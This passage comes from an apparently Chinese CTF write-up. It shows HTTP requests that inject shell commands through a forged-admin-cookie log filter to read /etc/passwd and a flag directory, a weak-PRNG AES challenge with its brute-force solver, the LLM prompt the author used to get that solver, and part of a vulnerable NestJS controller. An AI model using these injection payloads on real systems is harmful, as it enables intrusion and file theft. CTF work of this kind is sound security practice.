class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/logs.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>web-f2bccde0d7.challenge.xctf.org.cn</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>31</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://web-f2bccde0d7.challenge.xctf.org.cn</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://web-f2bccde0d7.challenge.xctf.org.cn/logs.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>role=admin; username=admin; auth_token=YToyOntzOjg6InVzZXJuYW1lIjtzOjM6ImRldiI7czo0OiJoYXNoIjtzOjMyOiI1ZGEwYjcxNTZkZDk1ZGQ3ZjdlYmNlNjA4YTBhNDY2YiI7fQ==</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">action</span>=filter_logs&amp;filter=<span class="string">&quot;$&#123;IFS&#125;/etc/passwd;whoami&quot;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/logs.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>web-f2bccde0d7.challenge.xctf.org.cn</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>31</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://web-f2bccde0d7.challenge.xctf.org.cn</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://web-f2bccde0d7.challenge.xctf.org.cn/logs.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>role=admin; username=admin; auth_token=YToyOntzOjg6InVzZXJuYW1lIjtzOjM6ImRldiI7czo0OiJoYXNoIjtzOjMyOiI1ZGEwYjcxNTZkZDk1ZGQ3ZjdlYmNlNjA4YTBhNDY2YiI7fQ==</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-powershell">action=filter_logs&amp;<span class="keyword">filter</span>=<span class="string">&quot;<span class="variable">$</span>&#123;IFS&#125;/etc/passwd;head<span class="variable">$</span>&#123;IFS&#125;/data/fl&quot;</span><span class="string">&quot;ag&quot;</span></span></span><br></pre></td></tr></table></figure><p>提示说是一个目录</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/logs.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>web-f2bccde0d7.challenge.xctf.org.cn</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>31</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://web-f2bccde0d7.challenge.xctf.org.cn</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://web-f2bccde0d7.challenge.xctf.org.cn/logs.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>role=admin; username=admin; auth_token=YToyOntzOjg6InVzZXJuYW1lIjtzOjM6ImRldiI7czo0OiJoYXNoIjtzOjMyOiI1ZGEwYjcxNTZkZDk1ZGQ3ZjdlYmNlNjA4YTBhNDY2YiI7fQ==</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-powershell">action=filter_logs&amp;<span class="keyword">filter</span>=<span class="string">&quot;<span class="variable">$</span>&#123;IFS&#125;/etc/passwd;head<span class="variable">$</span>&#123;IFS&#125;/data/fl&quot;</span><span class="string">&quot;ag/f*&quot;</span></span></span><br></pre></td></tr></table></figure><h2 id="Weak-random"><a href="#Weak-random" class="headerlink" title="Weak_random"></a>Weak_random</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(flag)==<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">padding</span>(<span class="params">message</span>):</span><br><span class="line">    padding_len = <span class="number">16</span> - <span class="built_in">len</span>(message)%<span class="number">16</span></span><br><span class="line">    ret = <span class="built_in">hex</span>(padding_len)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(ret*padding_len)+message</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_weak_entropy</span>():</span><br><span class="line">    time_now=time.time()%<span class="number">10000</span></span><br><span class="line"></span><br><span class="line">    entropy_part1 = <span class="built_in">int</span>(time_now) &amp; <span class="number">0xFFFF</span> </span><br><span class="line"></span><br><span class="line">    entropy_part2 = os.getpid() &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line">    final_seed = entropy_part1 + (entropy_part2 &lt;&lt; <span class="number">8</span>) </span><br><span class="line">    random.seed(final_seed)</span><br><span class="line">    </span><br><span class="line">    key = random.getrandbits(<span class="number">128</span>) </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line">entropy_key=get_weak_entropy()</span><br><span class="line">iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">key_bytes = entropy_key.to_bytes(<span class="number">16</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">msg=padding(flag.encode())</span><br><span class="line">aes = AES.new(key_bytes,AES.MODE_CBC,iv=iv)</span><br><span class="line">enc = aes.encrypt(msg)</span><br><span class="line"><span class="built_in">print</span>(enc.<span class="built_in">hex</span>())</span><br><span class="line">check=hashlib.sha256(flag.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()  </span><br><span class="line"><span class="built_in">print</span>(check)</span><br><span class="line"><span class="comment">#enc=65049cc9e72061eb059a48696dc8c563b7f1092d9e98b5b19fa608f2274bcbb5306018dcbf41979d324de2bdfb022c4b</span></span><br><span class="line"><span class="comment">#check=997008b9fc51954c61e0bfb0ac0dba6c6b48b060a0a1db411ce83ff99e499e7b</span></span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/6/0penHarmonyCTF2025/QQ20250607-123246.jpg" alt="1"></p><p>LLM提示词为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Weak_random</span><br><span class="line">303PT</span><br><span class="line">CRYPTO</span><br><span class="line">一道弱伪随机数生成器题目，密钥的生成过程存在严重漏洞。</span><br><span class="line">老师这是一道密码的CTF题目，请密码老师以最专业的手法解决这道密码题目可以吗，给我写个脚本获得flag</span><br></pre></td></tr></table></figure><p>解出flag直接包裹提交即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># 给定数据</span></span><br><span class="line">enc_hex = <span class="string">&quot;65049cc9e72061eb059a48696dc8c563b7f1092d9e98b5b19fa608f2274bcbb5306018dcbf41979d324de2bdfb022c4b&quot;</span></span><br><span class="line">check = <span class="string">&quot;997008b9fc51954c61e0bfb0ac0dba6c6b48b060a0a1db411ce83ff99e499e7b&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将密文转换为字节并分割为CBC分组</span></span><br><span class="line">ciphertext = <span class="built_in">bytes</span>.fromhex(enc_hex)</span><br><span class="line">C1 = ciphertext[<span class="number">0</span>:<span class="number">16</span>]  <span class="comment"># 第一密文块</span></span><br><span class="line">C2 = ciphertext[<span class="number">16</span>:<span class="number">32</span>]  <span class="comment"># 第二密文块</span></span><br><span class="line">C3 = ciphertext[<span class="number">32</span>:<span class="number">48</span>]  <span class="comment"># 第三密文块</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破种子空间 (timestamp: 0-9999, pid: 0-255)</span></span><br><span class="line"><span class="keyword">for</span> timestamp <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">    <span class="keyword">for</span> pid <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="comment"># 重建弱熵种子</span></span><br><span class="line">        seed = timestamp + (pid &lt;&lt; <span class="number">8</span>)</span><br><span class="line">        random.seed(seed)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 生成AES密钥</span></span><br><span class="line">        key = random.getrandbits(<span class="number">128</span>).to_bytes(<span class="number">16</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 创建AES-ECB解密器（CBC解密只需分组解密）</span></span><br><span class="line">        cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 解密第二块：S2 = AES⁻¹(C2), P2 = S2 ⊕ C1</span></span><br><span class="line">            S2 = cipher.decrypt(C2)</span><br><span class="line">            P2 = <span class="built_in">bytes</span>(S2[i] ^ C1[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 解密第三块：S3 = AES⁻¹(C3), P3 = S3 ⊕ C2</span></span><br><span class="line">            S3 = cipher.decrypt(C3)</span><br><span class="line">            P3 = <span class="built_in">bytes</span>(S3[i] ^ C2[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 合并后32字节作为flag候选</span></span><br><span class="line">            flag_candidate = P2 + P3</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 验证SHA256</span></span><br><span class="line">            <span class="keyword">if</span> hashlib.sha256(flag_candidate).hexdigest() == check:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Found flag: <span class="subst">&#123;flag_candidate.decode()&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Seed: timestamp=<span class="subst">&#123;timestamp&#125;</span>, pid=<span class="subst">&#123;pid&#125;</span>&quot;</span>)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag not found! Adjust search parameters.&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="Filesystem"><a href="#Filesystem" class="headerlink" title="Filesystem"></a>Filesystem</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// admin.controller.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">    <span class="title class_">Controller</span>,</span><br><span class="line">    <span class="title class_">Post</span>,</span><br><span class="line">    <span class="title class_">Body</span>,</span><br><span class="line">    <span class="title class_">HttpException</span>,</span><br><span class="line">    <span class="title class_">HttpStatus</span>,</span><br><span class="line">    <span class="title class_">Response</span>, <span class="title class_">Get</span>, <span class="title class_">Query</span>, <span class="title class_">Request</span>, <span class="title class_">Render</span>, <span class="title class_">Optional</span>, <span class="title class_">BadRequestException</span>,</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">JwtService</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/jwt&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> fs <span class="keyword">from</span> <span class="string">&#x27;fs&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">IsInt</span>, <span class="title class_">IsOptional</span>, <span class="title class_">IsString</span>, <span class="title class_">Length</span>, validate&#125; <span class="keyword">from</span> <span class="string">&quot;class-validator&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> gray <span class="keyword">from</span> <span class="string">&quot;gray-matter&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> configFile = <span class="string">&quot;/opt/filesystem/adminconfig.lock&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AdminLoginDto</span> &#123;</span><br><span class="line">    <span class="meta">@IsOptional</span>()</span><br><span class="line">    <span class="meta">@IsString</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;Name must be a string&#x27;</span> &#125;)</span><br><span class="line">    <span class="meta">@Length</span>(<span class="number">0</span>, <span class="number">15</span>, &#123; <span class="attr">message</span>: <span class="string">&#x27;length &lt; 15&#x27;</span> &#125;)</span><br><span class="line">    <span class="attr">username</span>: <span class="built_in">string</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Length</span>(<span class="number">0</span>, <span class="number">15</span>, &#123; <span class="attr">message</span>: <span class="string">&#x27;length &lt; 15&#x27;</span> &#125;)</span><br><span class="line">    <span class="attr">password</span>: <span class="built_in">number</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@IsOptional</span>()</span><br><span class="line">    <span class="meta">@Length</span>(<span class="number">0</span>, <span class="number">15</span>, &#123; <span class="attr">message</span>: <span class="string">&#x27;length &lt; 15&#x27;</span> &#125;)</span><br><span class="line">    <span class="attr">slogon</span>: <span class="built_in">string</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Controller</span>(<span class="string">&#x27;/admin&#x27;</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">AdminController</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> username = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"><span class="keyword">private</span> <span class="keyword">readonly</span> <span class="attr">jwtService</span>: <span class="title class_">JwtService</span></span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">getAdminConfig</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> data = fs.<span class="title function_">readFileSync</span>(configFile, <span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">JSON</span>.<span class="title function_">parse</span>(data);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">HttpException</span>(<span class="string">&#x27;Failed to read config file&#x27;</span>, <span class="title class_">HttpStatus</span>.<span class="property">INTERNAL_SERVER_ERROR</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Post</span>(<span class="string">&#x27;login&#x27;</span>)</span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">login</span>(<span class="params"><span class="meta">@Body</span>() <span class="attr">body</span>: <span class="built_in">any</span>, <span class="meta">@Response</span>() res</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> loginUser = <span class="title class_">Object</span>.<span class="title function_">assign</span>(<span class="keyword">new</span> <span class="title class_">AdminLoginDto</span>(), body)</span><br><span class="line">        <span class="keyword">const</span> &#123; <span class="attr">password</span>: correctPassword, slogon &#125; = <span class="variable language_">this</span>.<span class="title function_">getAdminConfig</span>();</span><br><span class="line">        <span class="keyword">const</span> errors = <span class="keyword">await</span> <span class="title function_">validate</span>(loginUser, &#123;<span class="attr">forbidUnknownValues</span>: <span class="literal">false</span>&#125;);</span><br><span class="line">        <span class="keyword">if</span> (errors.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BadRequestException</span>(errors);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (loginUser.<span class="property">username</span> !== <span class="variable language_">this</span>.<span class="property">username</span> || loginUser.<span class="property">password</span> !== correctPassword) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">HttpException</span>(<span class="string">&#x27;Invalid credentials&#x27;</span>, <span class="title class_">HttpStatus</span>.<span class="property">UNAUTHORIZED</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> payload = &#123; <span class="attr">username</span>: <span class="variable language_">this</span>.<span class="property">username</span>, slogon &#125;;</span><br><span class="line">        <span class="keyword">const</span> token = <span class="variable language_">this</span>.<span class="property">jwtService</span>.<span class="title function_">sign</span>(payload);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        res.<span class="title function_">cookie</span>(<span class="string">&#x27;token&#x27;</span>, token, &#123; <span class="attr">httpOnly</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;登录成功&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Get</span>(<span class="string">&#x27;login&#x27;</span>)</span><br><span class="line">    <span class="meta">@Render</span>(<span class="string">&#x27;login&#x27;</span>)</span><br><span class="line">    <span class="title function_">renderLogin</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Get</span>(<span class="string">&#x27;index&#x27;</span>)</span><br><span class="line">    <span class="comment">// @Render(&quot;admin&quot;)</span></span><br><span class="line">    <span class="title function_">renderAdmin</span>(<span class="params"><span class="meta">@Request</span>() req, <span class="meta">@Response</span>() res</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">cookies</span>)</span><br><span class="line">        <span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!token) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;未授权&#x27;</span> &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> decoded = <span class="variable language_">this</span>.<span class="property">jwtService</span>.<span class="title function_">verify</span>(token);</span><br><span class="line">            <span class="keyword">const</span> profile = gray.<span class="title function_">stringify</span>(<span class="title function_">gray</span>(decoded.<span class="property">slogon</span>).<span class="property">content</span>, &#123;<span class="attr">username</span>: decoded.<span class="property">username</span>&#125;)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(profile)</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;admin&#x27;</span>, &#123;<span class="string">&quot;info&quot;</span>: profile&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;无效的令牌&#x27;</span> &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Get</span>(<span class="string">&#x27;changePassword&#x27;</span>)</span><br><span class="line">    <span class="comment">// @Render(&quot;admin&quot;)</span></span><br><span class="line">    <span class="title function_">change</span>(<span class="params"><span class="meta">@Request</span>() req, <span class="meta">@Response</span>() res</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">cookies</span>)</span><br><span class="line">        <span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!token) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title 